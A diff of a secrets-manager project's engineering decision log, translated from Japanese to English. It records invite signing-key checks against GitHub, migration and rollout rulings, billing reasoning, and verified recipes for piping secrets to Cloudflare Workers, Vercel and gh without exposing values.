+**K5 (CLI — IV2)**: `github-signing-keys.ts` (`GET /users/{login}/ssh_signing_keys` unauthenticated, fixed host, sends only the login, 10-second timeout. The result is a closed type `match / not-registered / no-user / unavailable`, **not a CliError** = the backing source can only ever be grounds to omit the ceremony), `key-publish.ts` (`key publish [--gh]` + `offerGithubRegistration` right after key generation), `identityBacking` (`github-signing-keys` default / `none`. A typo falls to the default = never falls toward removing the comparison), `invite create --github` / `invite accept --from` / `member add --github`. The server gained `providerLogin` on `/auth/me` (optionalKey — self information only), used as material for the link's `il`. Rulings:
+- **Accepter-side satisfaction form 4**: issuance signature OK + `is` ∈ GitHub(`il`).signing_keys → non-interactive on `--from` match; interactively a yes naming the login. **`--from` / `il` mismatch refuses**. Agent environments require `--from` (no standing in for the yes). Non-terminals return to the ceremony (note)
+- **Inviter-side satisfaction form 4**: issuance, both signatures OK + acceptance key ∈ GitHub(destination).signing_keys → no confirmation input (passes in agent environments too — the naming was a deliberate act at issuance). Combining `--expect-fingerprint` requires it on top of the comparison. **Unregistered gets the two choices** (only on an interactive terminal with no flag: empty answer = stop and "ask them to `key publish`, then retry"; yes = enter the ceremony). Unreachable / `none` → note + ceremony
+- **Deviation from the spec (2026-09-13 owner approval — spec wording adjusted to the implementation)**: the "interactive input" of the destination login at `member add` (drafted in AUTH_SPEC §15-3 / 21-4 item 8) was **not provided** — it mixes with the ceremony's re-entry prompt, and a typo becomes a query to a different person's GitHub. The destination is limited to explicit `invite create --github` (the pin) or `member add --github` (naming is a deliberate act at issuance or via a flag). No safety difference, only UX, and forgetting yields the same result via re-running `member add --github`. The post-implementation re-examination (3 options: per spec / flag-and-pin only / interactive only when pinless) reached the same conclusion. AUTH_SPEC §15-3 / CRYPTO_SPEC §6.5 / iv-spec-drafts / 21-2 rulings D, F / 21-4 item 8 were corrected the same day
+- **Machine-comparison successes are not recorded in the fingerprint book** (ruling D ②). `key publish`'s stdout is the key line only (usable via `| pbcopy`)
+- **K0 was not run** (this environment's proxy blocks api.github.com). The assumptions and the owner's checklist are in docs/notes/spike-iv2.md. The places to correct based on real GitHub responses are also enumerated in that note
+- Tests: `identity-backing.test.ts` (the query's 5 shapes, `key publish` / `--gh`, the registration path, config), the satisfaction-form-4 paths of invite / member add, help golden. `bun run check` passes (124 files / 3105 tests)
 
-**PR #171 pullfrog レビュー対応(2026-09-13)**: (1) `verifyIssuance` の到達不能な空文字列フォールバックを除去(発行文をローカル束縛)、(2) `inviteUniqueConflictOf` が legacy `inv_token_hash` の UNIQUE 違反も `linkPub` の 409 に写す(素の再 throw = 500 にしない)、(3) AUDIT_SPEC §3.2 の注記が 2 列表の 3 セル目に落ちて描画されなかったのを payload セルへ統合、(4) **legacy `token_hash` 列 + `inv_token_hash` の撤去**を追跡項目として ROADMAP の IV 行に記す(→ 2026-09-14 に撤去済み。下記)、(5) **ロールアウト順序と戻せない点**: サーバー → CLI の順で配る(旧 CLI × 新サーバーは発行 body の schema 400 で止まり、旧サーバー × 新 CLI は `linkPubHex` 未知フィールドで 400 — どちらも受諾は起きない)。**v2 招待を 1 件でも発行した後のサーバー巻き戻しは不可**(旧コードは `link_pub` を解決できない)。デプロイ前の pending 行は 410 `unbound` になり一覧で可視(失効して再発行)。hosted 利用者は所有者のみなので実害なし、(6) **`invite create` が master 鍵を要するのは意図**(発行署名 = 招待者のチェーン sig 鍵。鍵なし `MARUHI_TOKEN` 端末での発行は失われるが、招待は人間の作為であり CI から発行する用途は無い。`invite list` / `revoke` は鍵なしのまま)。
+**PR #171 pullfrog review response (2026-09-13)**: (1) removed `verifyIssuance`'s unreachable empty-string fallback (the issuance is locally bound); (2) `inviteUniqueConflictOf` also maps a legacy `inv_token_hash` UNIQUE violation to the `linkPub` 409 (a bare re-throw mustn't become a 500); (3) AUDIT_SPEC §3.2's note had fallen into a 2-column table's 3rd cell and didn't render — merged into the payload cell; (4) **removal of the legacy `token_hash` column + `inv_token_hash`** is recorded on the ROADMAP's IV row as a tracking item (→ removed 2026-09-14, below); (5) **rollout order and the point of no return**: ship in the order server → CLI (old CLI × new server stops at the issuance body's schema 400; old server × new CLI stops at unknown-field `linkPubHex` 400 — neither lets an acceptance happen). **Rolling back the server is impossible once even one v2 invite has been issued** (old code can't resolve `link_pub`). Pending rows present before the deploy become 410 `unbound` and are visible on the list (revoke and re-issue). The only hosted user is the owner, so no practical harm; (6) **`invite create` requiring the master key is intentional** (the issuance signature = the inviter's chain sig key. Issuance from a keyless `MARUHI_TOKEN` device is lost, but invites are a human act and there's no use case for issuing from CI. `invite list` / `revoke` stay keyless).
 
-**IV 後始末(2026-09-14 — 所有者裁定「利用者がいないうちは古い実装をすべて削除してよい」)**: IV 改訂前の互換経路を全部撤去した。サーバー = `invitations.token_hash` 列 + `inv_token_hash` の削除、`link_pub` / `head_hash` / `head_seq` / `issue_signature` を NOT NULL(表再構築マイグレーション。旧行〔`link_pub` NULL〕は再構築前に DELETE)、410 理由 `unbound` の廃止、一覧行 `issuance` の必須化。CLI = 発行文なし行の分岐(`unbound`)、旧形式の発行ピン(`tokenHashHex`)の読み飛ばし、旧アンカー(`inviterSigPubHex` なし)の許容を削除(アンカーは sig 鍵の一致を常に検査)。AUTH_SPEC §15-1 / §15-2 を追随。旧ピンファイルを持つ端末は破損扱い(fail-open の警告)になるので `invites/<projectId>.json` を消して再受諾する — 所有者の端末のみ。 表再構築の下り(down)マイグレーションは無い: 適用後にサーバーを #171 以前へ戻すと発行(INSERT が `token_hash` を名指し)と一覧(SELECT)が落ちるので、戻すには `ops-backup` の D1 スナップショットからの復元が必要(再デプロイだけでは戻らない)。展開順は「マイグレーション適用 → サーバー deploy → CLI 配布」— 逆順だと新 CLI が旧サーバーの 410 `unbound` を復号できず、案内文なしで落ちる。マイグレーション中の `PRAGMA foreign_keys` 対は削除した(`invitations` に FK が無く、remote D1 での挙動が未検証のため — pullfrog 指摘)。
+**IV cleanup (2026-09-14 — owner ruling "while there are no users, all old implementations may be deleted")**: removed every pre-IV-revision compatibility path. Server = deleted the `invitations.token_hash` column + `inv_token_hash`, made `link_pub` / `head_hash` / `head_seq` / `issue_signature` NOT NULL (a table-rebuild migration; old rows〔`link_pub` NULL〕were DELETEd before rebuild), retired the 410 reason `unbound`, made list-row `issuance` required. CLI = deleted the no-issuance-row branch (`unbound`), skipping old-format issuance pins (`tokenHashHex`), and allowing old anchors (no `inviterSigPubHex`) (the anchor now always checks the sig key match). AUTH_SPEC §15-1 / §15-2 followed. A device holding an old pin file is treated as corrupt (a fail-open warning) → delete `invites/<projectId>.json` and re-accept — only the owner's device. The table rebuild has no down migration: rolling the server back past #171 after applying it breaks issuance (the INSERT names `token_hash`) and the list (the SELECT) — reverting requires restoring from an `ops-backup` D1 snapshot (redeploying alone won't). Deploy order is "apply migration → deploy server → distribute CLI" — the reverse order has the new CLI unable to decode the old server's 410 `unbound`, failing with no guidance. The `PRAGMA foreign_keys` pair during migration was removed (`invitations` has no FKs and its behavior on remote D1 is unverified — pullfrog point).
 
-**K6(docs)**: 新ページ `/docs/invite-a-teammate`(3 コマンドの表 → `key publish` → 発行 / 受諾 / 追加 → `identityBacking none` → 12 語のフォールバック)、getting-started の Next steps から導線、ROADMAP IV 行。**残**: K0 の実測(所有者)→ 文面補正、crypto の人間レビュー、PR 化(所有者の指示待ち)。
+**K6 (docs)**: new page `/docs/invite-a-teammate` (a 3-command table → `key publish` → issue / accept / add → `identityBacking none` → the 12-word fallback), an inbound link from getting-started's Next steps, the ROADMAP IV row. **Remaining**: K0's measurement (owner) → wording corrections, crypto's human review, PR-ification (awaiting the owner's instruction).
 
-### 補足 3: コストと課金の線(2026-09-04 追記)
+### Supplement 3: the cost / billing line (added 2026-09-04)
 
-競合(Doppler 無料 5 件、Infisical 無料 10 件)が同期を有料化の線にしているのは、同期をサーバーが実行するため(定期ジョブ・リトライ・統合先トークンの保管・同期先 API の変更追随・失敗時のサポート)の運用コストもあるが、主には「同期を複数使う = チームで本番運用 = 払う人」というシグナルを課金に使う価値ベースの線引きである。
+Competitors (Doppler free 5, Infisical free 10) draw their paywall line at sync partly for operational cost (the server runs sync — periodic jobs, retries, storing integration tokens, following destination API changes, support on failure), but mainly it's a value-based line that uses the signal "using multiple syncs = running in production as a team = someone who pays".
 
-maruhi のスタックでは: **SY1〜SY3 はサーバーコストがゼロ**(実行は各人の機械か CI ランナー)。**SY4 / SY5(プリセット追加・gh 経路)も同じくゼロ**。変更通知(SY6 — 需要駆動)を入れる場合だけ変更 1 回につき小さな送信 1 回が加わるが、Workers の subrequest に個別課金はなく、リトライは DO alarm で足りる(プロジェクト単位のレート制限は付ける)。本当のコストは保守(同期先 API の変更へのプリセット更新・失敗時の問い合わせ)で、アダプタとプリセットの分離、および「サーバーが同期を実行しない」設計(壊れても運営側の障害にならない)がこれを小さくする。
+On maruhi's stack: **SY1–SY3 cost the server nothing** (execution is on each person's machine or a CI runner). **SY4 / SY5 (preset additions, the gh path) are likewise zero**. Only if change notification (SY6 — demand-driven) is added does one small send per change get added, but Workers subrequests carry no per-request billing, and retries are covered by DO alarms (a per-project rate limit is attached). The real cost is maintenance (updating presets for destination API changes, inquiries on failure), which the adapter / preset split and the "the server doesn't perform sync" design (a breakage doesn't become an operator-side outage) keep small.
 
-帰結: **同期は無料枠に置く**(入口のゲート・原価ゼロ・競合の有料化ポイントを無料で出せる差別化)。課金の線は同期件数ではなく org のメンバー数と Enterprise 枠(SSO・監査ストリーミング・商用サポート)に引く。将来セルフホスト向けに S5(サーバー復号 push)を入れる場合だけ、競合と同じ運用コストが運営(セルフホストでは各運営者)に乗る。
+Conclusion: **sync goes in the free tier** (an entry gate, zero marginal cost, and differentiation — giving away the point competitors charge for). The billing line is drawn not at sync count but at org member count and the Enterprise slot (SSO, audit streaming, commercial support). Only if S5 (server-decrypt push) is later added for self-hosting does a competitor-like operational cost land on the operator (each operator, for self-hosted).
 
-### SY1 実装時の裁定録(2026-09-05)
+### SY1 implementation-time ruling record (2026-09-05)
 
-対象は ROADMAP SY1 = 案 S1(レシピのみ・docs のみ): `maruhi run` と導入済みのベンダー CLI の組み合わせで Cloudflare Workers /
-Vercel へ値を運ぶ手順。CLI / サーバー / Web のコードは変えない。同時に SY2(exec ドライバ)の偵察を兼ね、各ベンダー CLI の実物で
-「stdin の形式・上書き・削除・環境指定・テレメトリの止め方」を確かめて末尾の申し送り表に残す。各裁定点は DP1〜DP5 と同じループ
-(案を 3 つ以上列挙 → 上位互換 / 銀の弾丸を探索 → 新案が出ない周が 1 回あれば終了 → 理由付きで選定)で決めた。判断基準は、
-ディスクレス(平文を `> .env`・一時ファイル・`tee`・ベンダー CLI の file 引数に置かない)・**値を exec される外部コマンドの argv に
-載せない**・一方通行(maruhi が正。同期先からの取り込みを書かない — ADR-0014)・導入済みのベンダー CLI だけ(`npx` / `bunx` で
-取りに行かない・依存追加なし)・**検証していないことを書かない**(確認した版と日付を残す)・英語(ADR-0017・DP5 の用語集)・
-「言わざる」(docs に外部スクリプト・画像なし)・競合比較の表示規律(competitive-analysis.md §6-1 — 星取表を置かない)。
+The target is ROADMAP SY1 = option S1 (recipes only, docs only): procedures to carry values to Cloudflare Workers / Vercel by combining `maruhi run` with an installed vendor CLI. No CLI / server / web code changes. Doubling as reconnaissance for SY2 (exec driver), each vendor CLI's real behavior on "stdin format, overwrite, delete, environment specification, how to disable telemetry" was verified and left in the tail handoff table. Each ruling point was decided by the same loop as DP1–DP5 (enumerate 3+ options → search for a superset / silver bullet → end once a round produces no new options → choose with reasons). The criteria: diskless (never place plaintext in `> .env`, temp files, `tee`, or a vendor CLI's file argument), **don't put values on the argv of an external exec'd command**, one-way (maruhi is the source of truth — don't write intake from a destination — ADR-0014), only installed vendor CLIs (don't fetch via `npx` / `bunx`, no added dependencies), **don't write what hasn't been verified** (record the verified version and date), English (ADR-0017, DP5's glossary), "not telling" (no external scripts or images in docs), the competitive-comparison display discipline (competitive-analysis.md §6-1 — no star table).
 
-**前提の訂正・発見(実物で判明した事実。日付はすべて 2026-09-05)**:
-(1) **wrangler 4.128.0**(リポジトリの厳密ピン — `bunx wrangler secret bulk --help` + `wrangler-dist/cli.js` の
-`parseBulkInputToObject`): file を省くと stdin を `readline` で EOF まで読み、まず JSON、失敗したら **dotenv 16.3.1** の
-`parse` で `.env` 形式と解釈する。dotenv の規則は `A=abc#def` → `abc`(引用符なしの `#` 以降は捨てる)、前後の空白を
-落とす、二重引用符内の `\n` を改行に展開、引用符内は複数行可(scratchpad で実測)。よって **`.env` 形式は `#`・空白・引用符・
-`\n` を含む値で壊れる**。JSON の値は `null`(= 削除)か文字列のみ(`validateFileSecrets`)。**stdin が空のとき「No content
-found in file, or piped input」を出すが終了コードは 0**(`return logger.error(...)`)。`--name` / `-e` はヘルプどおり。
-(2) **wrangler のテレメトリ**: `WRANGLER_SEND_METRICS` は **`true` / `false` 以外を与えると UserError で落ちる**
-(`getBooleanEnvironmentVariableFactory`)。`DO_NOT_TRACK=1|true` も効き(`isDoNotTrackEnabled`)、`wrangler telemetry disable`
-と `send_metrics = false` もある(上流 `packages/wrangler/telemetry.md` で確認)。デバッグログは `~/.config/.wrangler/logs`
-(`WRANGLER_LOG_PATH`)に書かれる — **値が混入しないかは未監査**(SY2 の D3)。
-(3) **Vercel CLI 59.11.7**(scratchpad へ `bun add vercel@latest` で導入して `env add --help` + `dist/` を読んだ。リポジトリの
-依存には足していない): `env add name [environment] [gitbranch]` は stdin が端末でなければ値を stdin から取る。ただし
-`readStandardInput` は **最初の `data` イベント 1 回分しか読まず、500 ms 以内に何も来なければ `""` に解決する**(パイプの
-チャンク 1 つ = 通常 64 KiB 超の値と、生成が遅い値は切れる)。`normalizeStdinEnvValue` は **1 行の値からだけ末尾の改行 1 つを
-落とし、複数行の値は末尾の改行を残す**。`--force` = 同じ target の既存変数を確認なしで上書き(無いと既存名の追加は失敗)。
-production / preview の既定は **sensitive**(以後ダッシュボードでも `env ls` でも読めない。`--no-sensitive` で抜けられるが
-チーム方針で禁止されうる)、development は sensitive 不可。`--value` フラグが存在する(argv に載る — 使わない)。
-`vercel env update` も stdin を受ける。エージェント検出時は `--non-interactive` が既定になる。テレメトリは
-`VERCEL_TELEMETRY_DISABLED=1`(公式 docs/cli/about-telemetry、最終更新 2026-03-17)か `vercel telemetry disable`。公式
-`docs/cli/env`(最終更新 2026-08-20)は `echo [value] | vercel env add` の例に「シェル履歴に残るので秘密には勧めない」と
-自ら注記している(= 値を argv に載せない規律と同じ線)。
-(4) **gh 2.100.0**(GitHub Releases の tarball を scratchpad へ展開。`secret set --help` + 上流 `pkg/cmd/secret/set/set.go`):
-`--body` を省き対話できないときは stdin を **すべて**読み `TrimRight("\r\n")`。`-f -` で dotenv 形式を stdin から複数件、
-`--env` / `--org` / `--user` / `--app {actions|agents|codespaces|dependabot}` / `-R`。封印(sealed box)はクライアント側。
-**gh にもテレメトリがある**(`gh help environment`: `GH_TELEMETRY=false|0`、`DO_NOT_TRACK=1|true`)— SY5 で off にする対象に加える。
-(5) **maruhi 側**: `run` の子は stdio を継承する(`live.ts` の `Bun.spawn` — `stdin/stdout/stderr: "inherit"`)ので、
-`maruhi run -- jq … | wrangler secret bulk` のように **パイプを外側のシェルに置き、ベンダー CLI を `maruhi run` の外で
-走らせられる**(ベンダー CLI の環境に他の秘密が入らず、`sh -c` の入れ子引用も要らない)。stdout に Note が混ざらないことは
-DP5 の決定 9(通知はすべて stderr)で保証済み。`printenv NAME` は未設定なら何も出さず終了コード 1(GNU / BSD とも)。
-(6) `sh -c '… "$VAL" …'` のようにシェルで値を展開すると、組み込みの引数でも **`set -x`(xtrace)が stderr に値を書く**。
-「外部コマンドの argv に出ない」だけでは足りない。
-(7) jq 1.7 の `$ENV[.] // error(...)`: jq では `""` も真なので空文字列の値は通し、**未設定だけ**が `error`(終了コード 5・
-出力なし)になる。`--args` の位置引数には名前だけが載る。
-(8) Cloudflare の docs は `wrangler secret bulk` のコマンドリファレンス個別ページが取得できず(推測 URL は 404)、
-「Secrets」ページ(developers.cloudflare.com/workers/configuration/secrets/ — 最終更新 2026-07-03)で JSON / `.env` の 2 形式と
-「1 回 100 件」だけ確認した。一次資料はピン留めした版の `--help` と実装(1)。
+**Premise corrections / discoveries (facts learned from the real things. All dates 2026-09-05)**:
+(1) **wrangler 4.128.0** (the repo's strict pin — `bunx wrangler secret bulk --help` + `wrangler-dist/cli.js`'s `parseBulkInputToObject`): when file is omitted, stdin is read via `readline` until EOF, parsed as JSON first, and on failure interpreted as `.env` format by **dotenv 16.3.1**'s `parse`. dotenv's rules: `A=abc#def` → `abc` (unquoted `#` onward is dropped), surrounding whitespace is stripped, `\n` inside double quotes expands to a newline, quotes allow multi-line (measured on a scratchpad). So **`.env` format breaks on values containing `#`, spaces, quotes, or `\n`**. JSON values are `null` (= delete) or strings only (`validateFileSecrets`). **When stdin is empty it prints "No content found in file, or piped input" but exits 0** (`return logger.error(...)`). `--name` / `-e` per the help.
+(2) **wrangler's telemetry**: `WRANGLER_SEND_METRICS` **fails with a UserError on anything other than `true` / `false`** (`getBooleanEnvironmentVariableFactory`). `DO_NOT_TRACK=1|true` also works (`isDoNotTrackEnabled`), and `wrangler telemetry disable` and `send_metrics = false` exist (confirmed in upstream `packages/wrangler/telemetry.md`). Debug logs are written to `~/.config/.wrangler/logs` (`WRANGLER_LOG_PATH`) — **whether values leak into them is unaudited** (SY2's D3).
+(3) **Vercel CLI 59.11.7** (installed into a scratchpad via `bun add vercel@latest`; read `env add --help` + `dist/`. Not added to the repo's dependencies): `env add name [environment] [gitbranch]` takes the value from stdin when stdin isn't a terminal. However, `readStandardInput` **reads only the first `data` event and resolves to `""` if nothing arrives within 500 ms** (a single pipe chunk = values over ~64 KiB, and slowly-generated values, get cut). `normalizeStdinEnvValue` **strips one trailing newline only from single-line values; multi-line values keep theirs**. `--force` = overwrite an existing variable on the same target without confirmation (without it, adding an existing name fails). production / preview default to **sensitive** (thereafter unreadable via the dashboard or `env ls`. `--no-sensitive` escapes it but may be forbidden by team policy); development can't be sensitive. A `--value` flag exists (puts the value on argv — don't use it). `vercel env update` also takes stdin. On agent detection, `--non-interactive` becomes default. Telemetry: `VERCEL_TELEMETRY_DISABLED=1` (official docs/cli/about-telemetry, last updated 2026-03-17) or `vercel telemetry disable`. The official `docs/cli/env` (last updated 2026-08-20) itself notes on its `echo [value] | vercel env add` example that "don't recommend this for secrets since it stays in shell history" (= the same line as the don't-put-values-on-argv discipline).
+(4) **gh 2.100.0** (expanded the GitHub Releases tarball into a scratchpad. `secret set --help` + upstream `pkg/cmd/secret/set/set.go`): without `--body` and unable to interact, it reads **all** of stdin and `TrimRight("\r\n")`. `-f -` takes dotenv format from stdin for multiple entries, `--env` / `--org` / `--user` / `--app {actions|agents|codespaces|dependabot}` / `-R`. Sealing (sealed box) is client-side. **gh has telemetry too** (`gh help environment`: `GH_TELEMETRY=false|0`, `DO_NOT_TRACK=1|true`) — add it to the things SY5 disables.
+(5) **maruhi's side**: `run`'s children inherit stdio (`live.ts`'s `Bun.spawn` — `stdin/stdout/stderr: "inherit"`), so **the pipe can be placed in the outer shell and the vendor CLI run outside `maruhi run`**, like `maruhi run -- jq … | wrangler secret bulk` (no other secrets enter the vendor CLI's environment, and no nested `sh -c` quoting is needed). stdout never gets Note mixed in — guaranteed by DP5 decision 9 (all notifications go to stderr). `printenv NAME` prints nothing and exits 1 when unset (GNU / BSD alike).
+(6) Expanding a value in the shell like `sh -c '… "$VAL" …'` writes the value to stderr under **`set -x` (xtrace)** even for a builtin's arguments. "Not on an external command's argv" is not enough.
+(7) jq 1.7's `$ENV[.] // error(...)`: in jq `""` is truthy, so empty-string values pass and **only unset** becomes `error` (exit code 5, no output). Only the names appear as `--args` positional arguments.
+(8) Cloudflare's docs: the dedicated command-reference page for `wrangler secret bulk` couldn't be fetched (the guessed URL is 404); on the "Secrets" page (developers.cloudflare.com/workers/configuration/secrets/ — last updated 2026-07-03) only the 2 formats JSON / `.env` and "100 per call" were confirmed. Primary sources are the pinned version's `--help` and the implementation (1).
 
-**A. 置き場所** — 列挙: (i) README に節を足す(README は「読み始める場所」で手順書ではない)/ (ii) `docs/SELF_HOSTING.md`
-(ROADMAP の文面どおりだが読者は運用者で、レシピの読者は CLI 利用者)/ (iii) **`apps/site/docs` に新ページ「Deploy targets」**
-(`/docs/deploy-targets` — SY2〜SY5 が同じページを育てる)/ (iv) `getting-started.mdx` の末尾に節(「最初の 5 分」が長くなり、
-SY2 以降で肥大する)/ (v) 複数箇所に置いて 1 か所を正にする。第 1 周の新案: **(iii) を正にして、README の Docs 一覧と
-getting-started の末尾「Next steps」からは 1 行のリンクだけ**(レシピ本文の複製を作らない)(あり)。同じ周で「対象ごとの
-サブディレクトリ(`deploy-targets/cloudflare-workers.mdx` …)」も検討 → 2 本のレシピに対して重く、SY4 で対象が増えたときに
-分割すればよい(棄却・申し送り)。第 2 周: なし。**選定 = (iii) + リンク**。ページ名は機能名(`sync`)でなく読者の問い
-(「どこへデプロイするか」)で付ける。サイドバーの順序は既定がアルファベット順(Deploy targets が Getting started の前に
-来る)ので、3 ページの frontmatter に `sidebar.order`(1 / 2 / 3)を明示した(`meta.ts` はルート直下に置けるか不明で、
-数字接頭辞はファイル名を変える)。`index.mdx` の Card を 3 枚にし、e2e(`e2e.test.ts`)の Card の断言と `llms.txt` の断言を
-追随させた。
+**A. Where it lives** — enumeration: (i) add a section to the README (the README is "where reading starts", not a procedures doc) / (ii) `docs/SELF_HOSTING.md` (matches the ROADMAP wording but its readers are operators; the recipes' readers are CLI users) / (iii) **a new page "Deploy targets" under `apps/site/docs`** (`/docs/deploy-targets` — SY2–SY5 grow the same page) / (iv) a section at the end of `getting-started.mdx` (makes "the first 5 minutes" long and swells from SY2 on) / (v) place it in several locations with one canonical. Round-1 new option: **(iii) as canonical, with just one-line links from the README's Docs list and getting-started's tail "Next steps"** (don't replicate the recipes' text) (available). In the same round, "a subdirectory per target (`deploy-targets/cloudflare-workers.mdx` …)" was also considered → too heavy for 2 recipes; split when the targets grow in SY4 (rejected — handoff). Round 2: none. **Chosen = (iii) + links**. The page is named by the reader's question ("where to deploy"), not the feature name (`sync`). Since the sidebar default is alphabetical (Deploy targets would come before Getting started), `sidebar.order` (1 / 2 / 3) was set explicitly on the 3 pages' frontmatter (whether `meta.ts` can live at the root is unclear, and numeric prefixes would change file names). `index.mdx`'s Cards were made 3, and e2e (`e2e.test.ts`)'s Card assertion and the `llms.txt` assertion were updated to follow.
 
-**B. 変数の列挙のしかた** — 列挙: (i) 利用者が名前を書く(`for name in A B`)/ (ii) `maruhi schema export` の JSON から
-`jq` で名前を取る(自動だが、宣言だけで値のない変数も含まれ、入れ子の `maruhi` と 2 本のパイプが要る)/ (iii) `maruhi pull`
-の一覧を切り出す(機械可読を約束していない — 弱い)/ (iv) `run` の内外の `env` を `comm` で比較(壊れやすい)/ (v) 子の
-環境を全部送る(**不可** — `PATH` 等が混ざる)/ (vi) CLI に名前一覧の出力を足す(**SY1 では不可** — SY2)。第 1 周の新案:
-**名前は利用者が明示し、「何があるか」は `maruhi pull`(名前・version・サイズのみ)で見る**(あり — 依存も自動化も要らず、
-「何を運ぶか」を利用者が選ぶことがそのまま W3〔公開設定・プラットフォーム所有の資源は運ばない〕の案内になる)。同じ周で
-**wrangler へ渡す形式**: `.env` 形式は前提の訂正 (1) で壊れる値があるので **JSON 一択**。JSON の組み立ては (a) `printf '{"%s":"%s"}'`
-(値のエスケープができない — 不可)/ (b) **`jq -n --args '$ARGS.positional | map({key: ., value: $ENV[.]}) | from_entries' NAMES…`**
-(値は `$ENV` から読む — argv に出ない・エスケープは jq)/ (c) `node -e` の 1 行(wrangler があれば node もあるが、`bunx wrangler`
-の利用者には無いかもしれず、可読性も落ちる)/ (d) `wrangler secret put NAME` を名前ごとに回す(jq 不要だが 1 件ずつデプロイ)。
-第 2 周の新案: **未設定の名前を `null` にしない**(あり — `$ENV[.]` は未設定で `null` になり、wrangler では `null` = 削除。
-`// error("… has no value")` で fail-closed にする〔前提の訂正 (7)〕)。第 3 周: なし。**選定 = 名前は明示 + `maruhi pull` で確認 +
-JSON は jq (b) + `// error`**。jq が無い環境向けの (d) は 1 行の言及もせず落とした(ページを薄く保つ。要望が出たら追記)。
-値の欠落は `maruhi schema set NAME --required` で `run` が子を起動する前に止まる(既存機能)ことを「Before you start」に書いた。
+**B. How to enumerate variable names** — enumeration: (i) the user writes the names (`for name in A B`) / (ii) take names from `maruhi schema export`'s JSON via `jq` (automatic, but includes declared value-less variables and needs a nested `maruhi` and two pipes) / (iii) extract the `maruhi pull` listing (not promised machine-readable — weak) / (iv) `comm`-compare `env` inside and outside `run` (fragile) / (v) send the child's whole environment (**not acceptable** — `PATH` etc. would be mixed in) / (vi) add a name-list output to the CLI (**not acceptable in SY1** — that's SY2). Round-1 new option: **names are specified by the user, and "what exists" is viewed via `maruhi pull` (names, versions, sizes only)** (available — needs no dependency or automation, and the user choosing "what to carry" doubles as the guidance for W3〔don't carry public config or platform-owned resources〕). In the same round, **the format given to wrangler**: `.env` format breaks on some values per premise correction (1), so **JSON only**. Assembling JSON: (a) `printf '{"%s":"%s"}'` (can't escape values — impossible) / (b) **`jq -n --args '$ARGS.positional | map({key: ., value: $ENV[.]}) | from_entries' NAMES…`** (values read from `$ENV` — not on argv; escaping is jq's job) / (c) a `node -e` one-liner (node exists if wrangler does, but maybe not for `bunx wrangler` users; readability drops too) / (d) loop `wrangler secret put NAME` per name (no jq needed, but one deploy per item). Round-2 new option: **don't let unset names become `null`** (available — `$ENV[.]` is `null` when unset, and to wrangler `null` = delete. Make it fail-closed with `// error("… has no value")`〔premise correction (7)〕). Round 3: none. **Chosen = explicit names + verify via `maruhi pull` + JSON via jq (b) + `// error`**. The jq-less option (d) was dropped without even a one-line mention (keep the page thin. Append if requested). "Before you start" notes that missing values stop `run` before it starts the child via `maruhi schema set NAME --required` (existing feature).
 
-**C. 値を argv に出さない書き方** — 列挙: (i) 純粋なパイプ(`printenv NAME | vendor`)だけを許す / (ii) 組み込み `printf '%s' "$VAL"`
-の引数は許す(`ps` には出ない)/ (iii) レシピごとに「平文が通る場所」を 1 行で明記する規則。第 1 周の新案: **「レシピは値を
-シェルで展開しない」を構造の規則にする**(あり — 値を読むのは常にそれを消費するプログラム〔`printenv` / jq の `$ENV`〕で、
-`"$VAL"` という展開が一切現れない。これで外部コマンドの argv だけでなく **`set -x` のトレース〔前提の訂正 (6)〕にも出ない**。
-(ii) はこれに反するので棄却)。第 2 周の新案: `sh -c` 自体を無くす(あり — Workers は前提の訂正 (5) によりパイプを外側に置け、
-`sh -c` が消えた。Vercel は変数ごとに 1 呼び出しなのでループが要り、`sh -c '…' sh NAME…` に位置引数で名前を渡す形〔名前だけが
-argv〕にした)。第 3 周: なし。**選定 = 展開しない規則 + ページ冒頭「How the recipes work」に 1 段落で明記**(レシピごとの
-注記は繰り返しになるので置かない)。
+**C. How to write without exposing values on argv** — enumeration: (i) allow only pure pipes (`printenv NAME | vendor`) / (ii) allow the builtin `printf '%s' "$VAL"`'s argument (doesn't appear in `ps`) / (iii) a rule stating "where plaintext flows" in one line per recipe. Round-1 new option: **make "the recipe never expands a value in the shell" a structural rule** (available — values are always read by the program that consumes them〔`printenv` / jq's `$ENV`〕and a `"$VAL"` expansion never appears. This keeps values off not just external-command argv but also **`set -x` traces〔premise correction (6)〕**. (ii) violates this, so rejected). Round-2 new option: remove `sh -c` itself (available — per premise correction (5), Workers can put the pipe outside, eliminating `sh -c`. Vercel needs one call per variable so a loop is needed; it became the `sh -c '…' sh NAME…` shape passing names as positional arguments〔only names on argv〕). Round 3: none. **Chosen = the no-expansion rule + one paragraph under the page-top "How the recipes work"** (per-recipe notes would repeat, so they're not placed).
 
-**D. 対象の範囲と別項目との境界** — 列挙: (i) Cloudflare Workers + Vercel(2026-09-05 所有者裁定の第一級)/ (ii) + `gh secret set`
-(SY5 第 1 段。同じ形で即日だが別項目)/ (iii) + Netlify(CLI が値を引数に取るため安全なレシピが書けない — SY4 は http)/
-(iv) + Cloudflare Pages(SY4 第 2 陣)。環境の対応付け: (a) 書かない / (b) **コマンド行で `maruhi run --env X` とベンダーの
-環境引数を並べて見せ、「maruhi の `--env` は復号する環境、ベンダーの環境は書き先」と 1 文で区別する** / (c) 対応表。第 1 周の
-新案: gh は実物で検証済み(前提の訂正 (4))なので同居させられるが、**別の ROADMAP 項目の取り込みは裁定の例外(所有者確認)**に
-当たる。本セッションは非対話のため、**ページには載せず、検証結果を下の申し送り表に残して SY5 第 1 段が転記だけで済む形にし、
-同居の可否は PR の人間タスクとして問う**(あり)。第 2 周: なし。**選定 = (i) + (b)**。Netlify は「Other platforms」に
-1 文(「CLI が値を引数に取るのでこのページには載せない」)— 競合比較ではなく事実の注記。Pages は書かない。
+**D. Scope of targets and boundaries with other items** — enumeration: (i) Cloudflare Workers + Vercel (the first-class set per the 2026-09-05 owner ruling) / (ii) + `gh secret set` (SY5 stage 1. Same shape and same-day, but a separate item) / (iii) + Netlify (its CLI takes the value as an argument so no safe recipe can be written — SY4 is http) / (iv) + Cloudflare Pages (SY4 wave 2). Environment mapping: (a) don't write it / (b) **show `maruhi run --env X` and the vendor's environment flag side by side on the command line, distinguishing them in one sentence — "maruhi's `--env` is the environment it decrypts; the vendor's environment is the write target"** / (c) a mapping table. Round-1 new option: gh is verified on the real thing (premise correction (4)) so it could cohabit, but **absorbing another ROADMAP item counts as a ruling exception (owner confirmation)**. Since this session is non-interactive, **it isn't put on the page; the verified results go into the handoff table below so SY5 stage 1 is pure transcription, and whether cohabiting is OK is asked as a PR human task** (available). Round 2: none. **Chosen = (i) + (b)**. 